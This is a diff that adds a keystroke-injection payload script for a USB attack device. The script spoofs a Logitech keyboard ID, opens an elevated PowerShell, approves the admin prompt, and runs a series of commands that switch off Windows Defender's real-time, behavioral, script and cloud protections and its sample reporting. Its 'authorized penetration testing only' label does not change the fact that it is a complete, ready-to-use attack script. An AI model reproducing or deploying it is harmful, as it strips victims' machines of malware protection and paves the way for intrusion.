@@ -1,0 +1,43 @@
+REM Title: Disable Windows Defender
+REM Author: Community
+REM Target: Windows 10/11 (requires admin)
+REM Description: Disables Windows Defender real-time protection
+REM AUTHORIZED PENETRATION TESTING ONLY
+REM
+ID 046D:C31C Logitech USB Keyboard
+
+DELAY 1500
+
+GUI x
+DELAY 500
+STRING a
+DELAY 1500
+ALT y
+DELAY 1500
+
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableBehaviorMonitoring $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableIOAVProtection $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableScriptScanning $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableBlockAtFirstSeen $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -SubmitSamplesConsent NeverSend
+ENTER
+DELAY 500
+STRING Set-MpPreference -MAPSReporting Disabled
+ENTER
+DELAY 500
+STRING Write-Output "Defender disabled"
+ENTER
+DELAY 1000
+STRING exit
+ENTER
